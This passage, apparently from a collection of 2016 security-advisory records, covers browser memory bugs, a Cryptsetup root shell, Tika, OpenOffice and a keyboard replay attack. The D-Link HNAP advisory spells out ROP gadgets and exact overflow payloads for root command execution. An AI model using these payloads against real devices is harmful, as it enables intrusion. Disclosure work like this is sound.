found in web-browsers which I've not released before. This is the
fourteenth entry in that series. Unfortunately I won't be able to
publish everything within one month at the current rate, so I may
continue to publish these through December and January.
The below information is available in more detail on my blog at
http://blog.skylined.nl/20161118002.html.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
Microsoft Edge CTextExtractor::GetBlockText OOB read
=====================================
(MS16-104, CVE-2016-3247)
Synopsis
--------
A specially crafted web-page can cause an integer underflow in Microsoft
Edge. This causes `CTextExtractor::GetBlockText` to read data outside of
the bounds of a memory block.
Known affected software, attack vectors and mitigations
-------------------------------------------------------
* Microsoft Edge 11.0.10240.16384
An attacker would need to get a target user to open a specially
crafted web-page. JavaScript is not necessarily required to trigger
the issue.
Description
-----------
Though I did not investigate thoroughly, I did find out the following:
* The root cause appears to be an integer underflow in a 32-bit
variable used in `CTextExtractor..GetBlockText` as an index to read a
`WCHAR` in a string buffer. This index is decreased once too often
and becomes -1, or a very large positive number depending on how it
is used.
* This does not result in a crash on 32-bit systems, as an integer wrap
causes the code to read one `WCHAR` before the start of the buffer,
which is normally also in allocated memory.
* On 64-bit systems, the 32-bit -1 value is interpreted as 0xFFFFFFFF,
a very large positive value. As this is an index into a `WCHAR`
string, it gets multiplied by two and added to the start of the
buffer to find the location of a `WCHAR` to read. This causes the OOB
read to be around 8Gb (!!) beyond the address at which the buffer is
allocated.
* The crash happens in code that appears to be rendering the web-page,
which does not immediately offer an obvious way of extracting
information using this bug.
Exploit
-------
This is where it gets interesting, as the OOB read happens
approximately 0x2`00000000 bytes after the address at which the buffer
is allocated. This presents us with a problem: how to store some
information that we'd be interested in reading at such a large offset
from the original allocation?
As one might come to expect from me, I used a heap spray. But it needed
to be a special kind of heap spray as I did not want to actually have to
allocate 8Gb of RAM. However, about ten years ago (boy, time flies!) I
developed a heap spray that uses significantly less RAM than a
traditional heap spray does; in practice probably about 33% in most
cases, but theoretically much more in ideal situations. I've been
meaning to blog about it, but never found the time to do so until today:
you can read all about it here:
http://blog.skylined.nl/20161118001.html
That said, I have not actually looked at whether it is possible to
exfiltrate useful information using this bug. However, I did write a
Proof-of-Concept that attempts to make sure something is allocated in
the area where the OOB read happens. This PoC uses these heap spray
tricks to spray the heap while minimizing memory use. The
Proof-of-Concept uses about ~5.3Gb to allocate the memory at around 8Gb
distance from the buffer (up to ~10Gb to be sure). When you load the PoC
in a 64-bit version of Edge, you may notice that, unlike the original
repro, it will not crash Edge (even though it does trigger the
issues): the heap spray has allocated the memory that the out-of-bounds
read accesses, and this prevents an access violation exception.
Refreshing the page is likely to screw up the precise allocation process
needed and will probably cause a crash.
This proves that it is theoretically possible to allocate information at
the address used by the code. All that is left is prove that the
information read by the code can be exfiltrated somehow, and you have a
working exploit. This is left as an exercises to the reader.
Time-line
---------
* June 2016: This vulnerability was found through fuzzing.
* June 2016: This vulnerability was submitted to ZDI and iDefense.
* July 2016: This vulnerability was acquired by ZDI.
* September 2016: This vulnerability was addressed by Microsoft in
MS16-104.
* November 2016: Details of this issue are released.
Cheers,
SkyLined"
2292,CVE-2015-2482 MSIE 8 jscript RegExpBase::FBadHeader use-after-free details,,CVE-2015-2482,"Throughout November, I plan to release details on vulnerabilities I
found in web-browsers which I've not released before. This is the
twelfth entry in that series. Unfortunately I won't be able to publish
everything within one month at the current rate, so I may continue to
publish these through December and January.
The below information is available in more detail on my blog at
http://blog.skylined.nl/20161116001.html.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 8 jscript RegExpBase::FBadHeader use-after-free
====================================================
(MS15-018, CVE-2015-2482)
Synopsis
--------
A specially crafted web-page can cause the Javascript engine of
Microsoft Internet Explorer 8 to free memory used for a string. The code
will keep a reference to the string and can be forced to reuse it when
compiling a regular expression.
Known affected software, attack vectors and mitigations
-------------------------------------------------------
* Microsoft Internet Explorer 8
An attacker would need to get a target user to open a specially
crafted web-page. Disabling Javascript should prevent an attacker
from triggering the vulnerable code path.
Description
-----------
Recompiling the regular expression pattern during a replace can cause
the code to reuse a freed string, but only if the string is freed from
the cache by allocating and freeing a number of strings of certain size,
as explained by Alexander Sotirov in his Heap Feng-Shui presentation.
Exploit
-------
Exploitation was not investigated.
Time-line
---------
* *March 2015*: This vulnerability was found through fuzzing.
* *March 2015*: This vulnerability was submitted to ZDI.
* *April 2015*: This vulnerability was acquired by ZDI.
* *October 2015*: Microsoft addressed this issue in MS15-018.
* *November 2016*: Details of this issue are released.
Cheers,
SkyLined"
2294,Re: [oss-security] CVE-2016-4484: - Cryptsetup Initrd root Shell,,CVE-2016-4484,"On Mon, Nov 14, 2016 at 08:45:51PM +0000, Hector Marco wrote:
> Hello All,
>
> Affected package
> ----------------
> Cryptsetup <= 2:1
Hi,
Can you clarify which versions are affected?
The latest upstream version is 1.7.3:
https://gitlab.com/cryptsetup/cryptsetup/commits/master
What is the 2:1 version?"
2296,CVE-2016-4484: - Cryptsetup Initrd root Shell,,CVE-2016-4484,"Hello All,
Affected package
----------------
Cryptsetup <= 2:1
CVE-ID
------
CVE-2016-4484
Description
-----------
A vulnerability in Cryptsetup, concretely in the scripts that unlock the
system partition when the partition is ciphered using LUKS (Linux
Unified Key Setup).
This vulnerability allows to obtain a root initramfs shell on affected
systems. The vulnerability is very reliable because it doesn't depend on
specific systems or configurations. Attackers can copy, modify or
destroy the hard disc as well as set up the network to exflitrate data.
In cloud environments it is also possible to remotely exploit this
vulnerability without having ""physical access.""
Full description:
-----------------
http://hmarco.org/bugs/CVE-2016-4484/CVE-2016-4484_cryptsetup_initrd_shell.html
Regards,
Hector Marco & Ismael Ripoll."
2301,CVE-2015-0040: Microsoft Internet Explorer 11 MSHTML CMapElement::Notify use-after-free details,,CVE-2015-0040,"Throughout November, I plan to release details on vulnerabilities I
found in web-browsers which I've not released before. This is the
tenth entry in that series.
The below information is available in more detail on my blog at
http://blog.skylined.nl/20161114001.html.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
Microsoft Internet Explorer 11 MSHTML CMapElement::Notify use-after-free
========================================================================
(MS15-009, CVE-2015-0040)
Synopsis
--------
A specially crafted web-page can cause MSIE 11 to interrupt the handling
of one `readystatechange` event with another. This interrupts a call to
one of the various `C<ElementName>Element::Notify` functions to make
another such call and at least one of these functions is non-reentrant.
This can have various repercussions, e.g. when an attacker triggers this
vulnerability using a `CMapElement` object, a reference to that object
can be stored in a linked list and the object itself can be freed. This
pointer can later be re-used to cause a classic use-after-free issue.
Known affected versions, attack vectors and mitigations
-----------------------
* Microsoft Internet Explorer 11
An attacker would need to get a target user to open a specially
crafted web-page. Disabling JavaScript should prevent an attacker from
triggering the vulnerable code path.
Description
-----------
When a `DocumentFragment` containing an applet element is added to the
DOM, all elements receive a notification that they are removed from the
`CMarkup`. Next, they are added to the DOM and receive notification of
being added to another `CMarkup`. When the applet is added, a
`CObjectElement` is created and added to the `CMarkup`. This causes a
`readystatechange` event to fire, which interrupts the current code.
During this `readystatechange` event, the DOM may be modified, which
causes further notifications to fire. However, elements in the
`DocumentFragment` that come after the applet element have already
received a notification that they have been remove from one `CMarkup`,
but not that they have been added to the new one. Thus, these elements
may receive another notification of removal, followed by two
notifications of being added to a `CMarkup`.
AFAICT, this event-within-an-event itself is the root cause of the bug
and allows memory corruption in various ways. I discovered the issue
because the code in `CMapElement::Notify` is non-reentrant and does not
handle this sequence of events well. This code maintains a singly linked
list of map elements that have been added to the document. An object
should never be added to this list twice, as this will cause a loop in
the list (a map element pointing to itself as the next in
the list). However, the event-within-an-event can be used to first cause
two consecutive calls to remove the same element from this list followed
by two calls to add the same element to the list. This results in the
following sequence of events:
* The first call to remove the element will remove it from the list.
* The second call to remove the element will do nothing.
* The first call to add the element will add it to the list.
* The second call to add the element will try to add it to the list
again, causing the list to contain a loop. This list is now corrupt.
At this point, an attacker can remove the `CMapElement`, causing the
code to try to remove it from the list and free it. However, because of
the loop in the list, the above code will not actually remove it from
the list. After this, the pointer in the list points to freed memory and
an attacker can force MSIE to reuse it.
Time-line
---------
* *September 2014*: This vulnerability was found through fuzzing.
* *September 2014*: This vulnerability was submitted to ZDI.
* *September 2014*: This vulnerability was acquired by ZDI.
* *February 2015*: Microsoft address this issue in MS15-009.
* *November 2016*: Details of this issue are released.
Cheers,
SkyLined"
2303,CVE-2016-9277: A IDX Out of Bound vulnerability in systemui can make crash and ui restart,,CVE-2016-9277,"Description of the potential vulnerability:
Severity: Low
Affected versions: L(5.0/5.1), M(6.0)
Disclosure status: Privately disclosed.
One of the activities in SystemUI can produce array index out of bounds exception as a combination of some APIs and it leads to UI restart.
The patch fixes the vulnerability in the corresponding APIs.
Fix:
http://security.samsungmobile.com/smrupdate.html#SMR-NOV-2016
SVE-2016-6906: A IDX Out of Bound vulnerability in systemui can make crash and ui restart
Sincerely,
Alipay unLimit Security Team"
2306,CVE-2016-6809 – Arbitrary Code Execution Vulnerability in Apache Tika’s MATLAB Parser,,CVE-2016-6809,"CVE-2016-6809 – Arbitrary Code Execution Vulnerability in Apache Tika’s MATLAB Parser
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected: 1.6-1.13
Description: Apache Tika wraps the jmatio parser (https://github.com/gradusnikov/jmatio) to handle MATLAB files. The parser uses native deserialization on serialized Java objects embedded in MATLAB files. A malicious user could inject arbitrary code into a MATLAB file that would be executed when the object is deserialized.
Mitigation: Turn off MATLAB file parsing or upgrade to Tika 1.14.
Credit: Pierre Ernst of salesforce.com discovered this issue and contributed to the fix."
2320,[CVE-2016-6563 / VU#677427]: Dlink DIR routers HNAP Login stack buffer overflow,,CVE-2016-6563,"tl;dr
A stack bof in several Dlink routers, which can be exploited by an
unauthenticated attacker in the LAN. There is no patch as Dlink did not
respond to CERT's requests. As usual, a Metasploit module is in the
queue (see [9] below) and should hopefully be integrated soon.
The interesting thing about this vulnerability is that it affects both
ARM and MIPS devices, so exploitation is slightly different for each type.
Link to CERT's advisory:
https://www.kb.cert.org/vuls/id/677427
Link to a copy of the advisory pasted below:
https://raw.githubusercontent.com/pedrib/PoC/master/advisories/dlink-hnap-login.txt
Have fun.
Regards,
Pedro
>> Multiple vulnerabilities in Dlink DIR routers HNAP Login function
(multiple routers affected)
>> Discovered by Pedro Ribeiro (pedrib gmail com), Agile Information
Security
==========================================================================
Disclosure: 07/11/2016 / Last updated: 07/11/2016
>> Background on the affected products:
""Smartphones, laptops, tablets, phones, Smart TVs, game consoles and
more – all being connected at the same time. That’s why we created the
new AC3200 Ultra Wi-Fi Router. With Tri-Band Technology and speeds up to
3.2Gbps, it delivers the necessary ultra-performance to power even the
most demanding connected homes, making it the best wireless home router
for gaming.""
>> Summary:
Dlink routers expose a protocol called HNAP (Home Network Administration
Protocol) on the LAN interface. This is a SOAP protocol that allows
identification, configuration, and management of network devices. It
seems Dlink uses an implementation of this protocol to communicate with
the router's web interface over the LAN. For more information regarding
HNAP, see [1] and [2].
Dlink has a long history of vulnerabilities in HNAP. Craig Heffner in
particular seems to have found a lot of them (see [3], [4], [5], [6],
[7], [8]).
This new vulnerability occurs in the processing of XML tags inside SOAP
messages when performing the HNAP Login action. The affected function
contains two subsequent stack overflows, which can be exploited by an
unauthenticated attacker on the LAN. It affects a number of Dlink
routers which span the ARM and MIPS architectures. A Metasploit module
that exploits this vulnerability for both architectures has been
released [9].
A special thanks to CERT/CC and Trent Novelly for help with disclosing
this vulnerability to the vendor. Please refer to CERT's advisory for
more details [10].
>> Technical details:
Vulnerability: Stack buffer overflow
CVE-2016-6563
Attack Vector: Remote
Constraints: Can be exploited by an unauthenticated attacker. See below
for other constraints.
Affected versions:
The following MIPS devices have been confirmed to be vulnerable:
DIR-823
DIR-822
DIR-818L(W)
The following ARM devices have been confirmed to be vulnerable:
DIR-895L
DIR-890L
DIR-885L
DIR-880L
DIR-868L -> Rev. B and C only
There might be other affected devices which are not listed above.
-----------------------
Vulnerability details and MIPS exploitation
-----------------------
The vulnerable function, parse_xml_value (my name, not a symbol), is
called from hnap_main (a symbol in the binary) in /htdocs/cgibin.
This function takes 3 arguments: the first is the request object /
string, the second is the XML tag name to be parsed inside the request,
and the third is a pointer to where the value of that tag should be
returned.
The function tries to find the tag name inside the request object and
then extracts the tag value, copying it first to a local variable and
then to the third argument. This function is called from hnap_main when
performing the HNAP Login action to obtain the values of Action,
Username, LoginPassword and Catpcha from the SOAP request shown above.
parse_xml_value(char* request, char* XMLtag, char* tag_value)
(...)
.text:00412264 xml_tag_value_start = $s2
.text:00412264 xml_tag_value_end = $s1
.text:00412264 C30 addu xml_tag_value_start, $v0, $s0
# s2 now points to <Action>$value</Action>
.text:00412268 C30 la $t9, strstr
.text:0041226C C30 move $a1, xml_tag_value_end # needle
.text:00412270 C30 jalr $t9 ; strstr
.text:00412274 C30 move $a0, xml_tag_value_start #
haystack
.text:00412278 C30 lw $gp, 0xC30+var_C20($sp)
.text:0041227C C30 beqz $v0, loc_4122BC
.text:00412280 C30 subu xml_tag_value_end, $v0,
xml_tag_value_start # s1 now holds the ptr to <Action>value$</Action>
.text:00412284 C30 bltz xml_tag_value_end, loc_4122BC
.text:00412288 C30 addiu $s0, $sp, 0xC30+xml_tag_var
.text:0041228C C30 la $t9, strncpy
.text:00412290 C30 move $a2, xml_tag_value_end # n
.text:00412294 C30 move $a1, xml_tag_value_start # src
.text:00412298 C30 addu xml_tag_value_end, $s0,
xml_tag_value_end
.text:0041229C C30 jalr $t9 ; strncpy # copies all
chars in <Action>$value$</Action> to xml_tag_var using strncpy
.text:004122A0 C30 move $a0, $s0 # dest
.text:004122A4 C30 move $a0, a2_ptr # a2_ptr is
a stack variable from hnap_main (passed as third argument to
parse_xml_value)
.text:004122A8 C30 lw $gp, 0xC30+var_C20($sp)
.text:004122AC C30 move $a1, $s0 # src
.text:004122B0 C30 la $t9, strcpy # copies
xml_tag_var into a2_ptr using strcpy
.text:004122B4 C30 jalr $t9 ; strcpy # the stack
of the calling function (hnap_main) is thrashed if 2408+ bytes are sent
.text:004122B8 C30 sb $zero, 0(xml_tag_value_end)
(...)
There are two overflows, therefore two choices for exploitation:
1) The local stack (on parse_xml_value) can be overrun with 3096+ bytes.
This overflow occurs even though strncpy is used, because the argument
to strncpy is simply the strlen of the value inside the XML tag.
2) Alternatively, it's possible to overrun the stack of the calling
function (hnap_main), using only 2408+ bytes - this is because strcpy is
used to copy the xml_tag_var onto the third argument received by
parse_xml_value, which is a pointer to a stack variable in hnap_main.
Exploiting 1) is easier, and the following example will explain how.
All the affected MIPS devices use the same version of uClibc
(libuClibc-0.9.30.3.so) and seem to load it at 0x2aabe000, which makes
exploitation trivial for all firmware versions. It should be noted that
the MIPS devices use the RTL8881a CPU, which is based on a Lextra
RLX5281 core. The Lextra RLX cores are MIPS clones, but they're bit
crippled as they are lacking a few load and store instructions. For this
reason, some generic shellcodes that work on MIPS might not work on
these CPUs (especially when obfuscated).
The devices also do not have NX, ASLR nor any other modern memory
protections, so the shellcode is executed directly on the stack.
However, it's necessary to use ROP to prepare the stack for execution,
which can be executed with gadgets taken from libuClibc-0.9.30.3.so.
Due to the way MIPS CPUs work, it's necessary to flush the CPU cache
before executing the exploit. This can be forced by calling sleep() from
libc (refer to
http://blog.emaze.net/2011/10/exploiting-mips-embedded-devices.html for
an explanation on the MIPS CPU caches).
So the ROP chain and shellcode will look like:
first_gadget - execute sleep and call second_gadget
.text:0004EA1C move $t9, $s0 <- sleep()
.text:0004EA20 lw $ra, 0x20+var_4($sp) <- second_gadget
.text:0004EA24 li $a0, 2 <- arg for sleep()
.text:0004EA28 lw $s0, 0x20+var_8($sp)
.text:0004EA2C li $a1, 1
.text:0004EA30 move $a2, $zero
.text:0004EA34 jr $t9
.text:0004EA38 addiu $sp, 0x20
second_gadget - puts stack pointer in a1:
.text:0002468C addiu $s1, $sp, 0x58
.text:00024690 li $s0, 0x44
.text:00024694 move $a2, $s0
.text:00024698 move $a1, $s1
.text:0002469C move $t9, $s4
.text:000246A0 jalr $t9
.text:000246A4 move $a0, $s2
third_gadget - call $a1 (which now has the stack pointer):
.text:00041F3C move $t9, $a1
.text:00041F40 move $a1, $a2
.text:00041F44 addiu $a0, 8
.text:00041F48 jr $t9
.text:00041F4C nop
When the crash occurs, the stack pointer is at xml_tag_value[3128]. In
order to have a larger space for the shellcode (3000+ bytes), it's
possible to jump back to xml_tag_value[0].
prep_shellcode_1 = 23bdf3c8 # addi sp,sp,-3128
prep_shellcode_2 = 03a0f809 # jalr sp
branch_delay = 2084f830 # addi a0,a0,-2000 (NOP executed as a
MIPS branch delay slot)
The final Action / Username / LoginPassword / Catpcha XML parameter
value will be:
shellcode + 'a' * (3072 - shellcode.size) + sleep() + '1' * 4 + '2' * 4
+ '3' * 4 + third_gadget + first_gadget + 'b' * 0x1c + second_gadget +
'c' * 0x58 + prep_shellcode_1 + prep_shellcode_2 + branch_delay
'a', 'b' and 'c' are just fillers to make up the buffer, while '1111',
'2222' and '3333' will be the values of s1, s2 and s3 registers (which
are not interesting for exploitation), and the rest is the ROP chain,
shellcode and stack preparation routine. The only bad character that
cannot be sent in the payload is the null byte as this is a str(n)cpy
overflow. Up to 3350 characters can be sent, as after that it's hard to
control the overflow in a reliable way. Note that all of this is to
exploit the first buffer overflow with strncpy, but the second buffer
overflow can be exploited in a similar way.
As explained above, due to the use of a crippled MIPS core, generic
shellcodes found on the Internet will likely fail. Some very simple ones
work, but the best is to craft a reliable one. The simple Metasploit
bind shell also seems to work pretty reliably if no encoder is used.
-----------------------
ARM exploitation
-----------------------
The same two stack overflows affect ARM, but require less bytes to
overflow the stack. The following snippet is the same part of
parse_xml_value as shown for MIPS (taken from firmware 2.03b01 for the
DIR-868 Rev. B):
.text:00018F34 C30 LDR R1, [R11,#src] ; src
.text:00018F38 C30 LDR R2, [R11,#n] ; n
.text:00018F3C C30 SUB R3, R11, #-xml_tag_var
.text:00018F40 C30 SUB R3, R3, #4
.text:00018F44 C30 SUB R3, R3, #4
.text:00018F48 C30 MOV R0, R3 ; dest
.text:00018F4C C30 BL strncpy ; first overflow occurs here
(xml_tag_var in parse_xml_stack) with 1024+ characters
.text:00018F50 C30 MOV R3, #0xFFFFFBEC
.text:00018F58 C30 LDR R2, [R11,#n]
.text:00018F5C C30 SUB R1, R11, #-var_4
.text:00018F60 C30 ADD R2, R1, R2
.text:00018F64 C30 ADD R3, R2, R3
.text:00018F68 C30 MOV R2, #0
.text:00018F6C C30 STRB R2, [R3]
.text:00018F70 C30 SUB R3, R11, #-xml_tag_var
.text:00018F74 C30 SUB R3, R3, #4
.text:00018F78 C30 SUB R3, R3, #4
.text:00018F7C C30 LDR R0, [R11,#a2_ptr] ; a2_ptr is is a
stack variable from hnap_main
.text:00018F80 C30 MOV R1, R3 ; src
.text:00018F84 C30 BL strcpy ; second overflow occurs here
The stack size will be smaller for both parse_xml_value and hnap_main
when compared to the MIPS binary. This time again it's easier to exploit
the easier strncpy overflow in parse_xml_value, but only 1024 bytes are
enough to overflow the stack. As with the MIPS exploit, the only bad
character is the null byte.
The affected ARM devices have a non-executable stack (NX) and 32 bit
ASLR. NX can be defeated with ROP, and the 32 bit ASLR is weak - there
are only 3 bytes that change in the address calculations, which means
there are only 4096 possible values. The attack has to be run several
times until the correct base address is hit, but this can usually be
achieved in less than 1000 attempts.
The easiest attack to perform is a return-to-libc to execute a command
with system(). To do this, R0 must point to the stack location where the
command is before system() is called. All the affected ARM devices seem
to use the same version of uClibc (libuClibc-0.9.32.1.so) for all
firmware versions, which makes gadget hunting much easier and allows
building an exploit that works on all the devices without any modification.
first_gadget (pops system() address into r3, and second_gadget into PC):
.text:00018298 LDMFD SP!, {R3,PC}
second_gadget (puts the stack pointer into r0 and calls system() at r3):
.text:00040CB8 MOV R0, SP
.text:00040CBC BLX R3
system() (Executes argument in r0 (our stack pointer)
.text:0005A270 system
The final Action / Username / LoginPassword / Catpcha XML parameter
value will be:
'a' * 1024 + 0xffffffff + 'b' * 16 + 'AAAA' + first_gadget + system() +
second_gadget + command
a / b = filler
0xffffffff = integer n (see below)
AAAA = R11
first_gadget = initial PC
payload = stack points here after execution of our ROP chain; it should
point to whatever we want system() to execute
When the overflow happens, the stack var ""n"" is overwritten, which is
used to calculate a memory address (see 0x18F58). In order not to crash
the process before the shellcode is executed, the variable needs to be
set to a numeric value that can be used to calculate a valid memory
address. A good value to choose is 0xffffffff, as this will just
subtract 1 from the calculated memory address and prevent an invalid
memory access.
From this point onwards, it's possible to execute any command in
""payload"". For example, wget can be used to download a shell and execute
it or a telnet server can be started. All commands will be executed as root.
>> Fix:
Dlink did not respond to my or CERT's request for information, so no
firmware fix is available at the time of writing.
Given that this vulnerability can only be exploited in the LAN, it is
recommended to have a strong wireless password to prevent untrusted
clients from connecting to the router.
>> References:
[1]
https://isc.sans.edu//diary/More+on+HNAP+-+What+is+it,+How+to+Use+it,+How+to+Find+it/17648
[2] https://en.wikipedia.org/wiki/Home_Network_Administration_Protocol
[3] http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/
[4] http://www.devttys0.com/2015/04/what-the-ridiculous-fuck-d-link/
[5] http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/
[6]
https://packetstormsecurity.com/files/134370/D-Link-DIR-818W-Buffer-Overflow-Command-Injection.html
[7] https://dl.packetstormsecurity.net/papers/attack/dlink_hnap_captcha.pdf
[8]
http://www.dlink.com/uk/en/support/support-news/2015/april/13/hnap-privilege-escalation-command-injection
[9] https://github.com/rapid7/metasploit-framework/pull/7543
[10] https://www.kb.cert.org/vuls/id/677427
================
Agile Information Security Limited
http://www.agileinfosec.co.uk/
>> Enabling secure digital business >>"
2352,CVE-2016-6804 Apache OpenOffice Windows Installer Untrusted Search Path,,CVE-2016-6804,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
CVE-2016-6804
<http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6804>
Apache OpenOffice Advisory
<https://www.openoffice.org/security/cves/CVE-2016-6804.html>
Title: Windows Installer Execution of Arbitrary Code with Elevated Privileges
Version 1.0
Announced October 11, 2016
Description
The Apache OpenOffice installer for Windows contained a defective
operation that allows execution of arbitrary code with elevated
privileges.
The location in which the installer is run may have been previously
poisoned by a file that impersonates a dynamic-link library that
the installer depends upon. The counterfeit is operated instead
because of a search-path defect in the installer. The counterfeit
will be operated under the administrative privileges of the OpenOffice
installer, compromising the user's PC.
Severity: Medium
There are no known exploits of this vulnerability.
Proof-of-concept demonstrations exist.
Vendor: The Apache Software Foundation
Versions Affected:
All Apache OpenOffice versions 4.1.2 and older
are affected. OpenOffice.org versions are also
affected.
Mitigation:
Install Apache OpenOffice 4.1.3 for the latest maintenance and
cumulative security fixes. Use <https://www.openoffice.org/download/>.
Defenses and Work-Arounds:
If you are unable to update to 4.1.3, there are other
precautions that can be taken. These precautions are also
recommended as protection against other software that may
have the vulnerability.
When executing .exe installers, ensure that the installer
is in a file folder that has no files but the installer
.exe file.
If an installer proposes a folder to extract the setup
files into before the actual install, choose the name of
a folder that is not in use. Delete such a folder of setup
files after the installation completes successfully. To
reinstall without downloading again, preserve the installer
.exe on private removable storage.
Further Information:
For additional information and assistance, consult the Apache
OpenOffice Community Forums, <https://forum.openoffice.org/> or
make requests to the <mailto:users openoffice apache org> public
mailing list. Defects not involving suspected security
vulnerabilities can be reported via
<http://www.openoffice.org/qa/issue_handling/pre_submission.html>.
The latest information on Apache OpenOffice security bulletins
can be found at the Bulletin Archive page
<http://www.openoffice.org/security/bulletin.html>.
Credits:
The Apache OpenOffice project acknowledges the reporting and
analysis for CVE-2016-6804 by Stefan Kanthak and by Himanshu Mehta.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2
iQEcBAEBCAAGBQJYD4CxAAoJEPluif/UVmKKwJ0IAIp5Z5WGus5iaDcOYanVS+QN
ng1SCb+0jitCiqmVy9Xv5/diVEgogRxOu0tryV5flAaChepsRehpuJmRRftxYTS0
aNkQiKDSkd9d3XswAa0xfcQWaojANgYwV6aMGx1MstfRo3aIdRtHvNqjygU1ANyR
z3UipEyRYmrRgeeHq5cBNBQQv+gGfKXMHr2nvfaOD5FSqvwa/3jEWbpagYHwXfyV
18QqITRw5qG6sP/sQXw1I3CPez4+SbZebJZ2cuBSnnSmoojOQ3EJi69hESLOM2S5
I4xiraQSYygTeybU3u2OARtsXejb8qa7d9pYB+JwboPVKam03s32X+0ZnBnv3Y4=
=nKLP
-----END PGP SIGNATURE-----"
2362,"[CVE-2016-5195] ""Dirty COW"" Linux privilege escalation vulnerability",,CVE-2016-5195,"Debian: https://security-tracker.debian.org/tracker/CVE-2016-5195
Redhat: https://access.redhat.com/security/cve/cve-2016-5195
FAQ: https://dirtycow.ninja/"
2379,"[SYSS-2016-043] Microsoft Wireless Desktop 2000 - Cryptographic Issues (CWE-310), Insufficient Protection against Replay Attacks",CWE-310,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-043
Product: Microsoft Wireless Desktop 2000
Manufacturer: Microsoft
Affected Version(s): Ver. A
Tested Version(s): Ver. A
Vulnerability Type: Cryptographic Issues (CWE-310)
Insufficient Protection against Replay Attacks
Risk Level: Medium
Solution Status: Open
Manufacturer Notification: 2016-05-19
Solution Date: -
Public Disclosure: 2016-10-05
CVE Reference: Not yet assigned
Authors of Advisory: Matthias Deeg and Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
Microsoft Wireless Desktop 2000 is a wireless desktop set consisting of
a mouse and a keyboard.
The manufacturer describes the product as follows (see [1]):
""This keyboard features Advanced Encryption Standard (AES) technology,
which is designed to help protect your information by encrypting your
keystrokes. Each keyboard is permanently paired with its receiver at
the factory - no key information is ever shared over the air.""
Due to an insecure implementation of the encrypted data communication,
the wireless keyboard Microsoft Wireless Desktop 2000 is prone to replay
attacks with certain restrictions.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
The SySS GmbH found out that the Microsoft Wireless Desktop 2000
keyboard is prone to replay attacks with some limitations.
An attacker can sniff the AES-encrypted data packets of the 2.4 GHz
radio communication sent by the keyboard to the receiver (USB dongle)
and replay the recorded communication data causing the same effect as
the original data communication.
According to test results of the SySS GmbH, the Microsoft Wireless
Desktop 2000 keyboard and its USB dongle have implemented a replay
protection based on an incrementing packet counter. But the used
window for valid packet counter values is large enough to perform
a replay attack if there were not too many data packets caused by
further keystrokes between the attacker's recording and the playback.
A replay attack against the keyboard can, for example, be used to gain
unauthorized access to a computer system that is operated with a
vulnerable Microsoft Wireless Desktop 2000 keyboard. In this attack
scenario, an attacker records the radio communication during a
password-based user authentication of his or her victim, for instance
during a login to the operating system or during unlocking a screen
lock. At an opportune moment when the victim's computer system is
unattended, the attacker approaches the victim's computer and replays
the previously recorded AES-encrypted data communication for the
password-based user authentication and by this gets unauthorized access
to the victim's system.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
The SySS GmbH could successfully perform a replay attack as described
in the previous section using the USB radio dongle Crazyradio PA (see
[2]) and a simple proof-of-concept software tool.
The following output exemplarily illustrates a replay attack with the
recorded data packets for the word ""test"".
# python simple_replay.py
Simple nRF24 Replay Tool v0.1 by Matthias Deeg - SySS GmbH (c) 2016
[*] Configure radio
[*] Start recording. Press <CTRL+C> to stop recording ...
[+] Received data: 099816019c49e8e3d7004fb2c6d1c999c5cdd0d6
[+] Received data: 099816019c49e8e3d7004fb2c6d1c999c5cdd0d6
[+] Received data: 083816016234008e
[+] Received data: 083816016234008e
[+] Received data: 099816016ae20e05e28d725888c4ede685f918e7
[+] Received data: 099816016ae20e05e28d725888c4ede685f918e7
[+] Received data: 09981601896c8f035a7a800fcf0a5ba58be156e4
[+] Received data: 09981601896c8f035a7a800fcf0a5ba58be156e4
[+] Received data: 0838160164340088
[+] Received data: 0838160164340088
[+] Received data: 099816019703529705956290664c0cda94ab28b6
[+] Received data: 099816019703529705956290664c0cda94ab28b6
[+] Received data: 0998160168690f3817261c9e068577dd450a245a
[+] Received data: 0998160168690f3817261c9e068577dd450a245a
[+] Received data: 083816016634008a
[+] Received data: 083816016634008a
[+] Received data: 083816016634008a
[+] Received data: 083816016634008a
[+] Received data: 09981601653e89ebf7499ce2b7f962e9da48c5f4
[+] Received data: 09981601653e89ebf7499ce2b7f962e9da48c5f4
[+] Received data: 09981601f7612ae3b196b5767ab0a4dd615651e2
[+] Received data: 0838160168340084
[+] Received data: 0838160168340084
[+] Received data: 09981601db67b32134efa3fefd8b01efb124581d
[+] Received data: 09981601db67b32134efa3fefd8b01efb124581d
^C
[*] Stop recording
[*] Press <ENTER> to replay the recorded data packets or <CTRL+C> to quit ...
[+] Send data: 099816019c49e8e3d7004fb2c6d1c999c5cdd0d6
[+] Send data: 099816019c49e8e3d7004fb2c6d1c999c5cdd0d6
[+] Send data: 083816016234008e
[+] Send data: 083816016234008e
[+] Send data: 099816016ae20e05e28d725888c4ede685f918e7
[+] Send data: 099816016ae20e05e28d725888c4ede685f918e7
[+] Send data: 09981601896c8f035a7a800fcf0a5ba58be156e4
[+] Send data: 09981601896c8f035a7a800fcf0a5ba58be156e4
[+] Send data: 0838160164340088
[+] Send data: 0838160164340088
[+] Send data: 099816019703529705956290664c0cda94ab28b6
[+] Send data: 099816019703529705956290664c0cda94ab28b6
[+] Send data: 0998160168690f3817261c9e068577dd450a245a
[+] Send data: 0998160168690f3817261c9e068577dd450a245a
[+] Send data: 083816016634008a
[+] Send data: 083816016634008a
[+] Send data: 083816016634008a
